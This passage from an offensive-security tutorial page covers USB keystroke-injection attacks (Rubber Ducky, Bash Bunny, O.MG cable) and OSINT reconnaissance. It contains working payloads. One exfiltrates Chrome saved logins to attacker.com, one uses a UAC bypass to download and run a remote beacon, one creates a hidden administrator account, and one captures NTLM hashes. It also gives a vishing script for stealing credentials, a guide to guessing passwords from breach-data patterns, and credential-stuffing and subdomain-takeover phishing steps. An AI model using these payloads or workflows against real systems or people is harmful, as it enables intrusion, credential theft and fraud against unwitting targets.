STRING powershell -NoP -NonI -W Hidden "$data = Get-Content $env:LOCALAPPDATA\Google\Chrome\User Data\Default\'Login Data' -Raw; Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST -Body $data"
ENTER

# 4. Create Admin User:
DELAY 1000
GUI r
DELAY 500
STRING cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add
ENTER

# 5. Rick Roll (harmless prank):
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER

# Compiling DuckyScript:
# Use Hak5 encoder: https://duck-encoder.netlify.app/
# Or command-line tool:
java -jar encoder.jar -i payload.txt -o inject.bin

# Copy inject.bin to Rubber Ducky SD card</div>

            <h4>Bash Bunny</h4>

            <div class="code"># Bash Bunny = Multi-vector USB attack platform
# Can act as: Keyboard, Ethernet, Serial, Mass Storage
# Runs Linux, supports any scripting language

# Hardware: https://shop.hak5.org/products/bash-bunny

# Switch Positions:
# ‚Ä¢ Switch 1: Payload in /payloads/switch1/
# ‚Ä¢ Switch 2: Payload in /payloads/switch2/
# ‚Ä¢ Switch 3: Arming mode (for payload development)

# Example Payload (QuickCreds):

#!/bin/bash
# Title: QuickCreds
# Description: Harvests credentials from Windows
# Author: Hak5

# LED color feedback
LED R  # Red = starting

# Attack mode: Ethernet + mass storage
ATTACKMODE RNDIS_ETHERNET STORAGE

# Get victim's IP
GET TARGET_IP

# Start responder (captures NTLM hashes)
python /tools/responder/Responder.py -I usb0 -wrf

# LED green = capturing
LED G

# Wait for hashes
sleep 60

# Save hashes to /loot/
cp /tools/responder/logs/* /loot/

# LED blue = done
LED B

# Another payload (UAC Bypass + Backdoor):

#!/bin/bash
LED R

ATTACKMODE HID STORAGE

Q DELAY 1000
Q GUI r
Q DELAY 500
Q STRING powershell
Q ENTER
Q DELAY 1000

# Check if admin
Q STRING [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
Q ENTER

# If not admin, UAC bypass:
Q STRING New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Q ENTER
Q STRING Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start powershell" -Force
Q ENTER
Q STRING Start-Process computerdefaults.exe
Q DELAY 3000

# Download and execute beacon:
Q STRING IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')
Q ENTER

LED G

# O.MG Cable (malicious USB cable):

# Looks: Exactly like normal Lightning/USB-C cable
# Reality: Hidden WiFi chip + keystroke injection
# Access: WiFi hotspot (O.MG-XXXX)
# Web interface: http://192.168.4.1

# Payloads same as Rubber Ducky
# Advantage: Victim thinks it's just a charging cable!

# Detection Difficulty: VERY HIGH
# Defense: Only use your own cables, inspect electronics</div>

            <div class="metaphor-box">
                <h4>üéâ You're a Physical Pentester!</h4>
                <p>You've mastered:<br><br>
                ‚úÖ <strong>Lock Picking:</strong> Pin tumbler mechanism, SPP, raking, bumping, shimming, impressioning<br>
                ‚úÖ <strong>Badge Cloning:</strong> Proxmark3, Flipper Zero, HID Prox, Mifare Classic, NFC<br>
                ‚úÖ <strong>USB Attacks:</strong> Rubber Ducky, Bash Bunny, O.MG Cable, DuckyScript, keystroke injection<br><br>
                <strong>Physical pentesting methodology:</strong><br>
                1. <strong>Reconnaissance:</strong> Scout building, identify entry points, observe employees<br>
                2. <strong>Pretexting:</strong> Create believable cover story (IT contractor, delivery person, fire inspector)<br>
                3. <strong>Entry:</strong> Tailgate, badge clone, lock pick, or social engineering<br>
                4. <strong>Access:</strong> Plug in Bash Bunny, USB Rubber Ducky, or rogue WiFi AP<br>
                5. <strong>Persistence:</strong> Install physical backdoor (hidden Pi Zero, rogue AP, keylogger)<br>
                6. <strong>Exfiltration:</strong> Steal documents, plant listening devices, photograph screens<br>
                7. <strong>Exit:</strong> Leave no trace, maintain cover story<br><br>
                Physical security bypasses ALL network defenses. Never underestimate the power of walking through the door! üö™üîì</p>
            </div>
        </section>

        <!-- SECTION 11: Advanced OSINT & Reconnaissance -->
        <section id="advanced-osint" class="section">
            <h2 class="section-title">Advanced OSINT & Reconnaissance</h2>
            <p class="section-intro">Open Source Intelligence (OSINT) is the art of finding information hiding in plain sight. Before hacking, you need targets, credentials, vulnerabilities, employees, infrastructure, and attack surface understanding. OSINT provides ALL of this without touching the target network! This section covers Maltego for relationship mapping, theHarvester for email/subdomain enumeration, Recon-ng modular framework, Shodan IoT search engine mastery, advanced Google dorking, LinkedIn reconnaissance, breach databases, WHOIS/DNS analysis, and OSINT automation. By the end, you'll know more about your target than they know about themselves!</p>

            <div class=\"metaphor-box\">
                <h4>üí° OSINT = Google-Fu on Steroids</h4>
                <p><strong>What can you find with OSINT?</strong><br><br>
                ‚Ä¢ <strong>Employees:</strong> Names, emails, phone numbers, job titles, LinkedIn profiles<br>
                ‚Ä¢ <strong>Infrastructure:</strong> IP ranges, subdomains, email servers, DNS records, cloud assets<br>
                ‚Ä¢ <strong>Credentials:</strong> Breach databases, pastes, old dumps, password patterns<br>
                ‚Ä¢ <strong>Vulnerabilities:</strong> Shodan for exposed services, old CVEs, misconfigurations<br>
                ‚Ä¢ <strong>Physical locations:</strong> Google Maps, employee check-ins, geotagged photos<br>
                ‚Ä¢ <strong>Technologies:</strong> Wappalyzer, BuiltWith, job postings mentioning stack<br><br>
                <strong>Famous OSINT wins:</strong><br>
                ‚Ä¢ Bellingcat identified Russian military using geotagged social media photos<br>
                ‚Ä¢ Security researchers find 0-days by searching Shodan for vulnerable IoT devices<br>
                ‚Ä¢ Social engineering pretext built entirely from LinkedIn + breach databases<br><br>
                OSINT is LEGAL, PASSIVE, and POWERFUL! üîçüåê</p>
            </div>

            <h3>Part 1: Maltego - Visual Link Analysis</h3>

            <div class=\"code\"># Maltego = Graph-based OSINT tool (visual relationship mapping)
# Free Community Edition available

# Install:
# Download from: https://www.maltego.com/downloads/
# Or via Kali:
sudo apt install maltego

# Launch:
maltego

# First run: Register for free API key

# Creating Investigation:

# 1. New Graph
# 2. Add Entity (drag from palette):
#    - Domain
#    - Person
#    - Email Address
#    - Phone Number
#    - IP Address
#    - etc.

# 3. Run Transform:
# Right-click entity ‚Üí All Transforms
# Or specific transform:
#    - DNS from Domain
#    - Email Addresses from Domain
#    - Files and Documents from Domain

# Example: Investigate company.com

# Step 1: Add \"Domain\" entity
# Value: company.com

# Step 2: Run Transform \"DNS from Domain\"
# Returns:
#   - NS records (nameservers)
#   - MX records (mail servers)
#   - A records (IP addresses)

# Step 3: Run Transform \"Email Addresses from Domain\"
# Searches:
#   - Google
#   - Bing
#   - PGP key servers
#   - Public documents
# Returns: john@company.com, admin@company.com, etc.

# Step 4: From email addresses ‚Üí \"Person from Email\"
# Returns: Names associated with emails

# Step 5: From names ‚Üí \"Phones from Person\"
# Searches social media, WHOIS, etc.
# Returns: Phone numbers

# Step 6: From phones ‚Üí \"Location from Phone\"
# Returns: Geographic location

# After 5-10 transforms:
# Graph shows:
#   - 50+ entities
#   - Relationships between all
#   - Visual network map
#   - Attack surface!

# Advanced Transforms:

# VirusTotal Integration:
# Domain ‚Üí VirusTotal Passive DNS
# Shows all subdomains ever resolved

# Shodan Integration:
# IP Address ‚Üí Shodan Details
# Shows open ports, services, vulnerabilities

# Social Media:
# Person ‚Üí Twitter from Person
# Email ‚Üí Social Network from Email

# Document Metadata:
# Domain ‚Üí Documents from Domain
# ‚Üí Metadata from Document
# Extracts: Author names, software versions, file paths

# Custom Transforms:

# You can write Python transforms!
# Template:

from maltego_trx.entities import Domain, IPAddress
from maltego_trx.transform import DiscoverableTransform

class DNSToIP(DiscoverableTransform):
    @classmethod
    def create_entities(cls, request, response):
        domain = request.Value
        
        # Resolve DNS
        import socket
        ip = socket.gethostbyname(domain)
        
        # Add IP entity to graph
        response.addEntity(IPAddress, ip)

# Maltego Use Cases:

# 1. Corporate Investigation
# Start: Company domain
# Discover: All employees, emails, subdomains, IPs, social media

# 2. Person Investigation
# Start: Email address
# Discover: Real name, phone, addresses, social profiles, relatives

# 3. Infrastructure Mapping
# Start: Single IP
# Discover: All related IPs, domains, ASN, hosting provider

# 4. Breach Investigation
# Start: Leaked email
# Discover: Other breaches, password patterns, reused credentials

# Maltego Machines (Automated):

# Pre-built investigation workflows
# Example: \"Footprint L1\" machine
#   1. Adds domain
#   2. Resolves DNS
#   3. Finds emails
#   4. Enumerates subdomains
#   5. Maps infrastructure
# All automatic!

# Output:
# Export graph as:
#   - PDF report
#   - CSV data
#   - Image (PNG)
#   - Maltego graph file</div>

            <h3>Part 2: theHarvester - Email & Subdomain Harvesting</h3>

            <div class=\"code\"># theHarvester = Fast OSINT tool for emails, subdomains, IPs

# Install (comes with Kali):
sudo apt install theharvester

# Or latest version:
git clone https://github.com/laramies/theHarvester
cd theHarvester
pip3 install -r requirements.txt

# Basic usage:
theHarvester -d company.com -b all

# Flags:
# -d domain     ‚Üí Target domain
# -b source     ‚Üí Data source (google, bing, linkedin, etc.)
# -l limit      ‚Üí Limit results (default: 500)
# -f file       ‚Üí Save to HTML/XML/JSON

# Data sources:

# 1. Search Engines:
theHarvester -d company.com -b google
theHarvester -d company.com -b bing
theHarvester -d company.com -b yahoo

# 2. Social Networks:
theHarvester -d company.com -b linkedin
theHarvester -d company.com -b twitter

# 3. Certificate Transparency:
theHarvester -d company.com -b certspotter
theHarvester -d company.com -b crtsh

# Returns ALL subdomains from SSL certificates!

# 4. DNS Databases:
theHarvester -d company.com -b dnsdumpster
theHarvester -d company.com -b threatcrowd

# 5. Shodan:
theHarvester -d company.com -b shodan -s YOUR_SHODAN_API_KEY

# 6. VirusTotal:
theHarvester -d company.com -b virustotal

# 7. All sources at once:
theHarvester -d company.com -b all

# Output:
# [*] Harvesting emails...
# john.doe@company.com
# jane.smith@company.com
# admin@company.com
# support@company.com
# 
# [*] Harvesting subdomains...
# mail.company.com
# vpn.company.com
# dev.company.com
# staging.company.com
# api.company.com
# 
# [*] Harvesting IP addresses...
# 192.0.2.10
# 192.0.2.11
# 
# [*] Harvesting URLs...
# https://www.company.com/careers
# https://www.company.com/contact

# Advanced usage:

# Save results:
theHarvester -d company.com -b all -f company_report

# Output formats:
# company_report.html
# company_report.xml
# company_report.json

# Limit results:
theHarvester -d company.com -b google -l 100

# Only 100 results from Google

# Virtual host discovery:
theHarvester -d company.com -v

# Verifies if subdomains are alive

# DNS brute force:
theHarvester -d company.com -c

# Brute-forces common subdomain names

# Parsing results with Python:

import json

with open('company_report.json', 'r') as f:
    data = json.load(f)

emails = data['emails']
subdomains = data['hosts']

print(f\"Found {len(emails)} emails\")
print(f\"Found {len(subdomains)} subdomains\")

# Use for:
# - Phishing campaign target list
# - Subdomain takeover checks
# - Password spraying attacks
# - Infrastructure mapping</div>

            <h3>Part 3: Recon-ng - Modular Reconnaissance Framework</h3>

            <div class=\"code\"># Recon-ng = Metasploit for reconnaissance
# Modular, scriptable, database-backed

# Install:
sudo apt install recon-ng

# Or latest:
git clone https://github.com/lanmaster53/recon-ng.git
cd recon-ng
pip3 install -r REQUIREMENTS

# Launch:
recon-ng

# Recon-ng console:
[recon-ng][default] > 

# Create workspace:
[recon-ng][default] > workspaces create company_investigation

# Add domain:
[recon-ng][company_investigation] > db insert domains
domain (TEXT): company.com

# View domains:
[recon-ng][company_investigation] > db query SELECT * FROM domains

# Install modules:
[recon-ng][company_investigation] > marketplace search

# Install specific module:
[recon-ng][company_investigation] > marketplace install recon/domains-hosts/bing_domain_web

# View installed modules:
[recon-ng][company_investigation] > modules search

# Load module:
[recon-ng][company_investigation] > modules load recon/domains-hosts/bing_domain_web

# Set source:
[recon-ng][company_investigation][bing_domain_web] > options set SOURCE company.com

# Run module:
[recon-ng][company_investigation][bing_domain_web] > run

# Output:
# [*] Searching Bing for: site:company.com
# [*] mail.company.com
# [*] vpn.company.com
# [*] dev.company.com
# 
# [*] 3 hosts added to database

# View results:
[recon-ng][company_investigation] > db query SELECT * FROM hosts

# Useful modules:

# 1. Subdomain enumeration:
modules load recon/domains-hosts/certificate_transparency
run

modules load recon/domains-hosts/google_site_web
run

modules load recon/domains-hosts/hackertarget
run

# 2. Email harvesting:
modules load recon/domains-contacts/hunter_io
options set SOURCE company.com
run

# 3. Employee discovery:
modules load recon/companies-contacts/linkedin_contacts
options set SOURCE Company Name
run

# 4. IP to geolocation:
modules load recon/hosts-hosts/ipinfodb
run

# 5. Shodan integration:
modules load recon/hosts-ports/shodan_ip
options set SOURCE 192.0.2.10
run

# 6. Breach data:
modules load recon/contacts-credentials/hibp_breach
# (HaveIBeenPwned API)

# Reporting:

# Export to HTML:
[recon-ng][company_investigation] > db query SELECT * FROM hosts
# Copy-paste to report

# Or use reporting modules:
modules load reporting/html
options set FILENAME company_report.html
options set CREATOR \"Your Name\"
run

# Automation with Python:

from recon.core import base
import os

# Create recon-ng instance
r = base.Recon(base.Mode.CLI)

# Create workspace
r.do_workspaces('create test_workspace')

# Add domain
r.do_db('insert domains')
# Input: company.com

# Load and run module
r.do_modules('load recon/domains-hosts/bing_domain_web')
r.do_options('set SOURCE company.com')
r.do_run('')

# Query results
r.do_db('query SELECT * FROM hosts')</div>

            <h3>Part 4: Shodan - IoT & Infrastructure Search Engine</h3>

            <div class=\"code\"># Shodan = \"Google for hackers\"
# Indexes: Webcams, routers, SCADA, databases, IoT devices

# Web interface: https://www.shodan.io

# CLI tool:
pip install shodan

# Initialize with API key (free tier: 100 queries/month):
shodan init YOUR_API_KEY

# Basic searches:

# Find specific service:
shodan search apache

# Find in specific country:
shodan search apache country:US

# Find on specific port:
shodan search port:3389

# Find with default credentials:
shodan search \"default password\"

# Advanced filters:

# org:      Organization
# net:      IP range (CIDR)
# country:  Country code
# city:     City name
# port:     Port number
# os:       Operating system
# product:  Software name
# version:  Software version
# vuln:     CVE number

# Examples:

# 1. Find all MongoDB databases:
shodan search \"MongoDB Server Information\" port:27017

# Many exposed without authentication!

# 2. Find webcams:
shodan search \"Server: yawcam\" country:US

# Live webcam streams!

# 3. Find industrial control systems:
shodan search \"Siemens\" port:102

# SCADA systems!

# 4. Find Elasticsearch:
shodan search \"elastic indices\" port:9200

# Often contains sensitive data

# 5. Find devices vulnerable to specific CVE:
shodan search vuln:CVE-2021-44228

# All devices vulnerable to Log4Shell!

# 6. Find specific organization:
shodan search org:\"Target Company\"

# All internet-facing assets!

# 7. Find devices with specific title:
shodan search http.title:\"Dashboard\"

# Finds admin dashboards

# 8. Find FTP servers:
shodan search port:21 \"220\"

# Many allow anonymous access

# Shodan Python API:

import shodan

api = shodan.Shodan('YOUR_API_KEY')

# Search:
results = api.search('apache')

print(f\"Results found: {results['total']}\")

for result in results['matches']:
    print(f\"IP: {result['ip_str']}\")
    print(f\"Port: {result['port']}\")
    print(f\"Organization: {result.get('org', 'N/A')}\")
    print(f\"OS: {result.get('os', 'N/A')}\")
    print(\"-\" * 40)

# Host lookup (detailed info on specific IP):
host = api.host('192.0.2.1')

print(f\"IP: {host['ip_str']}\")
print(f\"Organization: {host.get('org', 'n/a')}\")
print(f\"Operating System: {host.get('os', 'n/a')}\")
print(f\"Ports: {host['ports']}\")

for item in host['data']:
    print(f\"Port: {item['port']}\")
    print(f\"Banner: {item['data']}\")

# Shodan Exploits API:
exploits = api.exploits.search('apache')

for exploit in exploits['matches']:
    print(f\"CVE: {exploit.get('cve', 'N/A')}\")
    print(f\"Description: {exploit['description']}\")

# Monitoring:
# Set up alerts for new assets:

# Web interface:
# Monitors ‚Üí Create Alert ‚Üí \"org:Company\"
# Email notification when new IPs appear!

# Shodan Honeyscore:
# Check if IP is honeypot:
score = api.labs.honeyscore('192.0.2.1')
print(f\"Honeypot score: {score}\")  # 0.0 - 1.0 (1.0 = definitely honeypot)

# Common Shodan queries:

# RDP exposed:
port:3389 country:US

# Telnet (often no auth):
port:23

# VNC (often no password):
\"authentication disabled\" port:5900

# Redis (no auth by default):
port:6379 \"redis_version\"

# MySQL:
\"MySQL\" port:3306

# Jenkins (CI/CD servers):
\"X-Jenkins\" \"Set-Cookie: JSESSIONID\"

# Docker API (remote code execution!):
\"Docker\" port:2375

# Kubernetes:
port:10250 ssl:\"kubernetes\"

# Printers:
\"HP LaserJet\" port:9100

# Building automation:
\"Niagara\" port:80</div>

            <h3>Part 5: Advanced Google Dorking</h3>

            <div class=\"code\"># Google Dorking = Using advanced search operators to find hidden info

# Basic operators:

# site:     Limit to specific site
site:company.com

# filetype: Specific file type
filetype:pdf

# intitle:  Words in title
intitle:\"index of\"

# inurl:    Words in URL
inurl:admin

# intext:   Words in body
intext:\"password\"

# cache:    Cached version
cache:company.com

# Combining operators:

# 1. Find exposed directories:
site:company.com intitle:\"index of\" \"parent directory\"

# Shows directory listings!

# 2. Find config files:
site:company.com filetype:env
site:company.com filetype:config
site:company.com filetype:ini

# Often contain database credentials!

# 3. Find database dumps:
site:company.com filetype:sql \"INSERT INTO\"

# 4. Find backup files:
site:company.com (ext:bak | ext:old | ext:backup)

# 5. Find login pages:
site:company.com inurl:login
site:company.com inurl:admin
site:company.com inurl:auth

# 6. Find exposed documents:
site:company.com (filetype:doc | filetype:pdf | filetype:xls)

# Metadata in docs often reveals:
#   - Employee names
#   - Internal paths (C:\\Users\\john\\Documents\\)
#   - Software versions

# 7. Find error messages:
site:company.com intext:\"sql syntax\"
site:company.com intext:\"Warning: mysql\"
site:company.com intext:\"PHP Fatal error\"

# Reveals technology stack!

# 8. Find subdomains:
site:*.company.com

# 9. Find email addresses:
site:company.com intext:\"@company.com\"

# 10. Find exposed API keys:
site:company.com inurl:api (key | token | secret)

# Google Dork Database:
# https://www.exploit-db.com/google-hacking-database

# Examples:

# Exposed .git folders:
inurl:\"/.git\" intitle:\"Index of\"

# AWS S3 buckets:
site:s3.amazonaws.com \"company\"

# Exposed phpMyAdmin:
intitle:\"phpMyAdmin\" inurl:\"index.php\"

# Zoom meeting recordings:
site:zoom.us inurl:rec \"company\"

# Trello boards:
site:trello.com \"company\"

# Google Docs:
site:docs.google.com \"company confidential\"

# Exposed webcams:
inurl:\"/view.shtml\"

# Exposed Jenkins:
intitle:\"Dashboard [Jenkins]\"

# Automation:

import requests
from googlesearch import search

def google_dork(query, num_results=10):
    results = []
    for url in search(query, num_results=num_results):
        results.append(url)
    return results

# Find all PDFs on target:
pdfs = google_dork('site:company.com filetype:pdf', num_results=50)

for pdf in pdfs:
    print(pdf)
    # Download and extract metadata</div>

            <h3>Part 6: LinkedIn Reconnaissance & Social Engineering</h3>

            <div class="code"># LinkedIn = GOLDMINE for corporate recon

# Manual reconnaissance:

# 1. Company employee list:
# Search: "people who work at Company Name"
# Gather:
#   - Names
#   - Job titles
#   - Email patterns (first.last@company.com?)
#   - Technologies mentioned in profiles
#   - Connections (org chart!)

# 2. Technologies used:
# Job postings reveal stack:
#   - "Experience with AWS, Kubernetes, PostgreSQL"
#   - "Python, Django, React"
# Now you know their tech stack!

# 3. Email pattern identification:
# Find 3+ employees with visible emails
# Patterns:
#   - first.last@company.com
#   - flast@company.com
#   - first_last@company.com
# Apply pattern to all employees!

# 4. Target identification:
# Who to phish?
#   - New employees (less security aware)
#   - HR (handle resumes ‚Üí open attachments)
#   - IT help desk (social engineering prone)
#   - Executives (high-value access)

# Automated LinkedIn OSINT:

# Tool: linkedin2username
git clone https://github.com/initstring/linkedin2username
cd linkedin2username
pip3 install -r requirements.txt

# Generate username list:
python3 linkedin2username.py -c "Company Name"

# Outputs: first.last format usernames
# Use for:
#   - Password spraying
#   - Email list for phishing
#   - Username enumeration

# Email verification:

# Tool: Hunter.io API
import requests

def verify_email(email):
    api_key = "YOUR_API_KEY"
    url = f"https://api.hunter.io/v2/email-verifier?email={email}&api_key={api_key}"
    response = requests.get(url)
    data = response.json()
    return data['data']['status']  # valid, invalid, accept_all

# Verify all generated emails:
with open('usernames.txt', 'r') as f:
    for username in f:
        email = f"{username.strip()}@company.com"
        status = verify_email(email)
        if status == 'valid':
            print(f"[+] {email} is valid!")

# Social engineering pretext building:

# From LinkedIn profile:
# Name: John Doe
# Title: Senior DevOps Engineer
# Company: TechCorp
# Education: MIT (2015)
# Skills: AWS, Docker, Kubernetes

# Phone call pretext:
# "Hi John, this is Mike from AWS Support. We noticed unusual activity
# on your TechCorp account related to your Kubernetes clusters.
# Can you verify your login credentials?"

# ‚Üí John trusts you because:
#   - You know his name
#   - You know his company
#   - You know they use AWS + Kubernetes
# All from LinkedIn!

# Advanced: Profile scraping

from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()
driver.get('https://www.linkedin.com/login')

# Login (use burner account)
driver.find_element(By.ID, 'username').send_keys('your_email')
driver.find_element(By.ID, 'password').send_keys('your_password')
driver.find_element(By.XPATH, '//button[@type="submit"]').click()

time.sleep(3)

# Search company employees:
driver.get('https://www.linkedin.com/search/results/people/?keywords=Company%20Name')

# Scrape profile links:
profiles = driver.find_elements(By.XPATH, '//a[@data-test-app-aware-link]')

for profile in profiles:
    link = profile.get_attribute('href')
    print(link)
    # Visit each profile, scrape details

driver.quit()

# Compile intelligence report:
# - 100+ employee names
# - Email addresses (verified)
# - Org chart (manager/employee relationships)
# - Tech stack (from job postings + profiles)
# - Physical locations (office addresses)
# - Phone numbers (sometimes in profiles)
# - Personal interests (social engineering hooks)</div>

            <h3>Part 7: Breach Database Intelligence</h3>

            <div class="code"># Breach databases = Password goldmine

# HaveIBeenPwned API:

import requests

def check_breach(email):
    url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
    headers = {
        'hibp-api-key': 'YOUR_API_KEY',
        'user-agent': 'OSINT Tool'
    }
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        breaches = response.json()
        print(f"[+] {email} found in {len(breaches)} breaches:")
        for breach in breaches:
            print(f"    - {breach['Name']} ({breach['BreachDate']})")
            print(f"      Data types: {', '.join(breach['DataClasses'])}")
    elif response.status_code == 404:
        print(f"[-] {email} not found in breaches")
    else:
        print(f"[!] Error: {response.status_code}")

# Check entire company:
with open('company_emails.txt', 'r') as f:
    for email in f:
        check_breach(email.strip())
        time.sleep(1.5)  # Rate limiting

# Output:
# [+] john.doe@company.com found in 3 breaches:
#     - LinkedIn (2012-05-05)
#       Data types: Email addresses, Passwords
#     - Dropbox (2012-07-01)
#       Data types: Email addresses, Passwords
#     - Adobe (2013-10-04)
#       Data types: Email addresses, Passwords, Usernames

# Now check Dehashed for actual passwords:

# Dehashed.com (paid service, worth it!)
# Search: john.doe@company.com

# Results:
# Email: john.doe@company.com
# Password: Summer2012!
# Source: LinkedIn breach

# Password pattern analysis:
# John's passwords:
#   - Summer2012! (LinkedIn, 2012)
#   - Summer2013! (Dropbox, 2013)
#   - Summer2014! (Adobe, 2014)
# Pattern: Summer[YEAR]!

# Current year: 2024
# Likely password: Summer2024!

# Use for:
#   - Password spraying
#   - Initial access
#   - Credential stuffing

# Automated breach checking:

from h8mail import h8mail_search

def search_breaches(email):
    # h8mail aggregates: HaveIBeenPwned, Snusbase, LeakLookup, etc.
    results = h8mail_search(email)
    
    for result in results:
        print(f"Email: {result['email']}")
        print(f"Password: {result['password']}")
        print(f"Source: {result['source']}")
        print("-" * 40)

# Pastebin monitoring:

import requests
import re

def search_pastebin(company):
    # Use Pastebin scraping API or Google dorks
    query = f"site:pastebin.com {company} password"
    
    # Or direct Pastebin API:
    url = "https://scrape.pastebin.com/api_scraping.php"
    params = {'limit': 100}
    response = requests.get(url, params=params)
    
    pastes = response.json()
    for paste in pastes:
        if company.lower() in paste['body'].lower():
            print(f"[+] Found paste: {paste['key']}")
            print(f"    URL: https://pastebin.com/{paste['key']}")
            
            # Extract credentials:
            credentials = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):(.+)', paste['body'])
            for email, password in credentials:
                print(f"    {email}:{password}")

# GitHub secret scanning:

import requests

def search_github_secrets(company):
    query = f"{company} password OR apikey OR api_key OR token OR secret"
    url = f"https://api.github.com/search/code?q={query}"
    
    headers = {'Authorization': 'token YOUR_GITHUB_TOKEN'}
    response = requests.get(url, headers=headers)
    
    results = response.json()
    for item in results.get('items', []):
        print(f"[+] {item['repository']['full_name']}/{item['path']}")
        print(f"    URL: {item['html_url']}")

# Credential stuffing workflow:
# 1. Collect emails from LinkedIn/theHarvester
# 2. Check HaveIBeenPwned for breaches
# 3. Search Dehashed for plaintext passwords
# 4. Identify password patterns
# 5. Generate likely current passwords
# 6. Test against:
#    - VPN portal
#    - Email (OWA/O365)
#    - SSH
#    - RDP
#    - Custom web apps</div>

            <h3>Part 8: Domain & DNS Intelligence</h3>

            <div class="code"># DNS = Treasure trove of infrastructure info

# WHOIS lookup:
whois company.com

# Output:
# Registrar: GoDaddy
# Creation Date: 2005-03-15
# Expiry Date: 2025-03-15
# Name Servers: ns1.company.com, ns2.company.com
# Registrant: Company Inc.
# Registrant Email: admin@company.com
# Registrant Phone: +1-555-0100

# Intelligence:
# - admin@company.com ‚Üí Email pattern confirmed
# - +1-555-0100 ‚Üí Phone for social engineering
# - Expiry date ‚Üí Domain hijacking opportunity if expired?
# - Nameservers ‚Üí Internal DNS? Or hosted (Route53, Cloudflare)?

# Historical WHOIS:
# whoishistory.com or DomainTools
# Shows previous owners, registrants
# Useful for domain history, ownership changes

# DNS enumeration:

# A records (IPv4):
dig company.com A

# AAAA records (IPv6):
dig company.com AAAA

# MX records (mail servers):
dig company.com MX

# Output:
# company.com  MX  10 mail1.company.com
# company.com  MX  20 mail2.company.com

# Mail servers identified! ‚Üí Email infrastructure
# Test for:
#   - Open relay
#   - User enumeration (VRFY, EXPN)
#   - SPF/DMARC misconfiguration

# NS records (nameservers):
dig company.com NS

# TXT records (SPF, DKIM, DMARC, verification):
dig company.com TXT

# Output:
# "v=spf1 include:_spf.google.com ~all"
# ‚Üí Company uses Google Workspace!

# "google-site-verification=abc123..."
# ‚Üí Owns this Google verification token

# CAA records (Certificate Authority Authorization):
dig company.com CAA

# Shows which CAs can issue certificates
# If not set ‚Üí Anyone can issue cert for domain (phishing!)

# Zone transfer attempt:
dig @ns1.company.com company.com AXFR

# If misconfigured, reveals ALL subdomains!
# Usually blocked, but worth trying

# Subdomain enumeration (passive):

# Certificate Transparency logs:
curl "https://crt.sh/?q=%25.company.com&output=json" | jq -r '.[].name_value' | sort -u

# Returns ALL subdomains from SSL certs!
# Example output:
# api.company.com
# dev.company.com
# staging.company.com
# mail.company.com
# vpn.company.com
# admin.company.com

# Subdomain brute force (active):

# Tool: fierce
fierce --domain company.com --subdomains /usr/share/wordlists/subdomains.txt

# Tool: amass
amass enum -active -d company.com -brute -w subdomains.txt

# Tool: subfinder
subfinder -d company.com -all -recursive

# Subdomain takeover check:

# Tool: subjack
git clone https://github.com/haccer/subjack
cd subjack
go build

./subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt

# Checks if subdomain points to:
#   - AWS S3 (but bucket doesn't exist) ‚Üí Takeover!
#   - GitHub Pages (but repo deleted) ‚Üí Takeover!
#   - Heroku (but app deleted) ‚Üí Takeover!
#   - Azure (but resource deleted) ‚Üí Takeover!

# If takeover possible:
# 1. Create S3 bucket with subdomain name
# 2. Upload phishing page
# 3. Subdomain now serves YOUR content!
# (On legitimate company subdomain!)

# DNS history:

# SecurityTrails.com (free API tier)
import requests

def dns_history(domain):
    api_key = "YOUR_API_KEY"
    url = f"https://api.securitytrails.com/v1/history/{domain}/dns/a"
    headers = {'APIKEY': api_key}
    
    response = requests.get(url, headers=headers)
    data = response.json()
    
    for record in data['records']:
        print(f"Date: {record['last_seen']}")
        print(f"IP: {record['values'][0]['ip']}")
        print("-" * 40)

# Shows all historical IPs for domain
# Useful for:
#   - Finding old, forgotten servers
#   - Tracking infrastructure changes
#   - Identifying hosting providers

# Reverse DNS:

# Find all domains on an IP:
dig -x 192.0.2.10

# Or use SecurityTrails reverse IP search:
url = f"https://api.securitytrails.com/v1/domains/list?ipv4=192.0.2.10"

# Finds:
#   - Virtual hosts on same server
#   - Other company domains
#   - Forgotten domains (potential attack surface)

# ASN enumeration:

# Find company's IP ranges:
whois -h whois.radb.net -- '-i origin AS12345' | grep -Eo "([0-9.]+){4}/[0-9]+"

# Or use bgpview.io:
curl "https://api.bgpview.io/asn/12345/prefixes" | jq -r '.data.ipv4_prefixes[].prefix'

# Output:
# 192.0.2.0/24
# 198.51.100.0/24

# Now scan entire IP ranges:
nmap -sn 192.0.2.0/24
nmap -sS -p- -T4 192.0.2.0/24

# Email server intelligence:

# MX lookup:
dig company.com MX

# Connect to mail server:
telnet mail.company.com 25

# SMTP banner:
220 mail.company.com ESMTP Postfix

# ‚Üí Running Postfix
# ‚Üí Check for vulnerabilities

# User enumeration:
VRFY admin@company.com
250 2.1.5 admin@company.com

# ‚Üí admin@company.com exists!

# SPF/DMARC check:
dig company.com TXT | grep spf
dig _dmarc.company.com TXT

# Weak SPF: "v=spf1 +all"
# ‚Üí Anyone can spoof emails!

# No DMARC: No _dmarc record
# ‚Üí Email spoofing possible!</div>

            <h3>Part 9: Social Media Intelligence (SOCMINT)</h3>

            <div class="code"># Social media = Personal information goldmine

# Twitter/X Intelligence:

# Tool: Twint (Twitter scraper, no API needed)
git clone https://github.com/twintproject/twint.git
cd twint
pip3 install . -r requirements.txt

# Search tweets from user:
twint -u target_user

# Search tweets containing keyword:
twint -s "company_name confidential"

# Search tweets near location:
twint -g "40.7128,-74.0060,10km"  # 10km around NYC

# Advanced search:
twint -u target_user --since "2024-01-01" --until "2024-12-31"

# Extract emails/phones from tweets:
twint -u target_user | grep -Eo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

# Instagram OSINT:

# Tool: Osintgram
